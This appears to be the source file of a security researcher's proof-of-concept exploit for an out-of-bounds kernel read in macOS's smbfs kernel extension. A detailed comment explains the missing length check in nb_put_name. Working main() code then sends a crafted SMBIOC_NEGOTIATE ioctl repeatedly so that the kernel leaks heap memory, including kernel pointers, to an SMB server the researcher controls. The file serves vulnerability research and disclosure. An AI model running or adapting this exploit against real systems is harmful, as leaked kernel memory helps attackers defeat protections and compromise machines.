//
//  main.c
//  poc_snb_name_oob_read
//
//  Created by sreejith on 3/16/22.
//

#include <assert.h>
#include <stdio.h>
#include <string.h>

#include <sys/mount.h>

#include <arpa/inet.h>
#include <IOKit/kext/KextManager.h>
#include <IOSurface/IOSurface.h>

#include <smbfs/smb_dev.h>
#include <smbfs/smb_dev_2.h>
#include <smbfs/smbfs.h>
#include <smbfs/smbclient_internal.h>
#include <smbfs/netbios.h>

#include <xe_smbx/smbx_conf.h>

#include "config.h"


///
/// NetBIOS name is a string of 16 characters. If a NetBIOS name is shorter than 16 characters
/// it is padded with spaces so that the resulting name will be 16 characters long [ 1 ].
///
/// For example, consider a NetBIOS name "FRED  ", which is 4 ASCII characters, F, R, E, D,
/// followed by 12 space characters. Depending upon the use case, NetBIOS names may be
/// encoded in following formats
///
/// 1. First-level encoding (uncompressed representation)
///
/// In this format, each character in the name is encoded using 2 bytes: each half-byte of the
/// character's ASCII code is added to the ASCII code 'A', so the encoded NetBIOS name will
/// be represented as a sequence of upper-case characters from the set {A,B,C...N,O,P} [ 2 ].
/// The above NetBIOS name "FRED  ", will be represented in this format as
///
/// EGFCEFEECACACACACACACACACACACACA
///
/// To form a valid domain name, the ASCII dot and the scope identifier is appended to the
/// encoded form of the NetBIOS name. For example, if the scope identifier is "NETBIOS.COM",
/// the resulting encoded NetBIOS domain name will be
///
/// EGFCEFEECACACACACACACACACACACACA.NETBIOS.COM
///
/// 2. Second-level encoding (compressed representation)
///
/// In this representation, domain names are expressed in terms of sequence of labels. Each
/// label is represented as a one octet length field, followed by that number of octets. A compressed
/// domain name is termiated by a length byte of zero. [ 3 ]
///
/// So the above encoded NetBIOS domain name will be represented using this encoding as:-
///
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |      0x20     |    E (0x45)   |    G (0x47)   |    F (0x46)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    C (0x43)   |    E (0x45)   |    F (0x46)   |    E (0x45)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    E (0x45)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0x41)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0x41)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0x41)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0x41)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0x41)   |    C (0x43)   |    A (0x41)   |    C (0x43)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    A (0X41)   |      0x07     |    N (0x4E)   |    E (0x45)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    T (0x54)   |    B (0x42)   |    I (0x49)   |    O (0x4F)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    S (0x53)   |      0x03     |    C (0x43)   |    O (0x4F)   |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
// |    M (0x4D)   |      0x00     |
// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
///
///
/// The compressed encoding is used to send NetBIOS names over network in NetBIOS packets.
///
/// In `smbfs.kext`, the following `struct` is used to store NetBIOS socket addresses
///
/// #define    NB_NAMELEN           16
/// #define    NB_ENCNAMELEN    NB_NAMELEN * 2
///
/// struct sockaddr_nb {
///     u_char                snb_len;
///     u_char                snb_family;
///     struct sockaddr_in    snb_addrin;
///     u_char                snb_name[1 + NB_ENCNAMELEN + 1];    /* encoded */
/// };
///
/// The field `snb_name` stores the NetBIOS name in compressed representation (Without the
/// scope identifier. Hence the size 34 bytes)
///
/// In order to support SMB servers using NetBIOS over TCP / IP transport (NBT), the `smbfs.kext`
/// has to setup a NetBIOS session before sending any SMB packets over the network to these
/// servers. To setup a NetBIOS session, a NetBIOS session request is sent to the SMB server.
/// This session request contains the NetBIOS names of local client machine and the remote
/// SMB server. To add the NetBIOS name to the raw request data sent to the SMB server,  the
/// method `nb_pub_name` defined in `smb_trantcp.c` is used.
///
/// The method `nb_put_name` is defined as follows:
///
/// static int
/// nb_put_name(struct mbchain *mbp, struct sockaddr_nb *snb)
/// {
///     int error;
///     u_char seglen, *cp;
///
///     cp = snb->snb_name;
///     if (*cp == 0)
///         return (EINVAL);
///     NBDEBUG("[%s]\n", cp);
///
///     for (;;) {
///         // ***NOTE***: integer overflow. If value of *cp is 255, seglen will be zero
///         //                      and this loop will never terminate.
///         seglen = (*cp) + 1;
///         error = mb_put_mem(mbp, (const char *)cp, seglen, MB_MSYSTEM);
///         if (error)
///             return (error);
///
///         // ***NOTE***: this loop will only break when it encounters a segment with zero length
///         if (seglen == 1)
///             break;
///
///         cp += seglen;
///     }
///     return (0);
/// }
///
/// The `nb_put_name` considers the NetBIOS name in the `snb_name` to be a encoded NetBIOS
/// domain name using compressed represenation. As noted in the code snippet above, the
/// `nb_put_name` method will keep on adding segments to the message buffer until it encounters
/// a segment with zero data length without taking into account the size of `snb_name`. If the
/// `snb_name` provided to this method is validated to be a valid 16 character NetBIOS name in
/// compressed representation, this will work fine. But if it is not validated, it could lead to OOB
/// read in kernel memory and the OOB read data will be sent to the SMB server
///
/// The method `nb_put_name` is used in the method `nbssn_rq_request` to send netbios request
/// containing local NetBIOS name and SMB server NetBIOS name over network as shown below:
///
/// static int
/// nbssn_rq_request(struct nbpcb *nbp)
/// {
///     struct mbchain mb, *mbp = &mb;
///     ...
///
///     error = mb_init(mbp);
///     if (error)
///         return (error);
///
///     // Add request parameters to mbp
///     mb_put_uint32le(mbp, 0);
///     nb_put_name(mbp, nbp->nbp_paddr);
///     nb_put_name(mbp, nbp->nbp_laddr);
///
///     // Add other parameters to mbp
///     ...
///     // Send request
///     ...
///     // Read and process response
///     ...
///     return (error);
/// }
///
/// The `nbssn_rq_request` is triggered while handling `SMBIOC_NEGOTIATE` ioctl command. The
/// `nbp->nbp_paddr` and `nbp->nbp_laddr` are socket addresses duplicated from `iod->iod_saddr`
/// and `iod_iod_laddr` respectively. The `ioc->iod_saddr` and `ioc->ioc_laddr` are socket addresses
/// directly copied in from the userland while handling `SMBIOC_NEGOTIATE` ioctl command.
/// The field `snb_name` of both these socket addresses are never validated. So by providing
/// socket addresses having crafted `snb_name` field with `SMBIOC_NEGOTIATE` ioctl command,
/// we can get the `smbfs.kext` to perform OOB read in kernel memory and send the OOB read
/// data to SMB server.
///
/// See poc bolow for more details
///
/// References:
/// [ 1 ] https://dzone.com/articles/practical-fun-with-netbios-name-service-and-comput
/// [ 2 ] https://jeffpar.github.io/kbarchive/kb/194/Q194203/
/// [ 3 ] https://www.rfc-editor.org/rfc/rfc1002.txt
///


int smb_client_load_kext(void) {
    return KextManagerLoadKextWithIdentifier(CFSTR("com.apple.filesystems.smbfs"), NULL);
}


int smb_client_open_dev(void) {
    char path[PATH_MAX];
    for (int i=0; i<1024; i++) {
        snprintf(path, sizeof(path), "/dev/nsmb%x", i);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            return fd;
        }
    }
    return -1;
}


int main(int argc, const char * argv[]) {
    smb_client_load_kext();
    
    printf("[INFO] make sure the poc_snb_name_oob_read_server is started before proceeding further. press enter to continue\n");
    getc(stdin);
    
    int smb_dev = smb_client_open_dev();
    if (smb_dev < 0) {
        printf("[ERROR] failed to open smb dev, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// The size of zone where input socket addresses to method `nb_put_name` are stored.
    /// These socket addresses are duplicated from `iod->iod_saddr` and `iod->iod_laddr`
    /// using `smb_dup_sockaddr` method and they are allocated on default.64 zone
    const int sockaddr_zone_size = 64;
    
    /// Length of OOB data to be read. As noted in the discussion above, if `nb_put_name`
    /// encounters a segment with 255 data length, the loop in `nb_put_name` will never break.
    /// Since pointers to kernel memory are common in OOB read data, and most of them have
    /// 0xfffffexxxxxxxxxx format, the oob_read_size is adjusted to prevent the header of 2nd
    /// label of NetBIOS name from overlapping with the 0xffff part of these pointers. This will
    /// reduce the probability of OOB read attempts getting stuck in infinite loop
    const int oob_read_size = 129;
    
    /// Account for data inside memory allocated for the socket address in default.64 zone
    const int snb_segment_length = sockaddr_zone_size - offsetof(struct sockaddr_nb, snb_name) + oob_read_size;
    assert(snb_segment_length < UINT8_MAX);
    
    struct sockaddr_nb smb_saddr;
    bzero(&smb_saddr, sizeof(smb_saddr));
    smb_saddr.snb_len = sizeof(struct sockaddr_nb);
    smb_saddr.snb_family = AF_NETBIOS;
    smb_saddr.snb_name[0] = (uint8_t)snb_segment_length;
    smb_saddr.snb_addrin.sin_len = sizeof(struct sockaddr_in);
    smb_saddr.snb_addrin.sin_family = AF_INET;
    smb_saddr.snb_addrin.sin_port = htons(SMB_SOCKET_PORT);
    inet_aton(SMB_SOCKET_HOST, &smb_saddr.snb_addrin.sin_addr);
    
    struct sockaddr_nb smb_laddr;
    bzero(&smb_laddr, sizeof(smb_laddr));
    smb_laddr.snb_len = sizeof(struct sockaddr_nb);
    smb_laddr.snb_family = AF_NETBIOS;
    smb_laddr.snb_name[0] = 1;
    
    struct smbioc_negotiate negotiate_req;
    bzero(&negotiate_req, sizeof(negotiate_req));
    negotiate_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    negotiate_req.ioc_saddr = (struct sockaddr*)&smb_saddr;
    negotiate_req.ioc_saddr_len = sizeof(smb_saddr);
    negotiate_req.ioc_laddr = (struct sockaddr*)&smb_laddr;
    negotiate_req.ioc_laddr_len = sizeof(smb_laddr);
    negotiate_req.ioc_extra_flags |= SMB_FORCE_NEW_SESSION;
    negotiate_req.ioc_ssn.ioc_owner = getuid();
    negotiate_req.ioc_extra_flags |= SMB_SMB1_ENABLED;
    
    int num_oob_reads = 10;
    
    /// Execute the OOB read. The OOB read data will be sent to the SMB server
    /// Check the output of poc_snb_name_oob_read_server to see the OOB read data
    for (int i=0; i<num_oob_reads; i++) {
        ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req);
    }
    
    return 0;
}
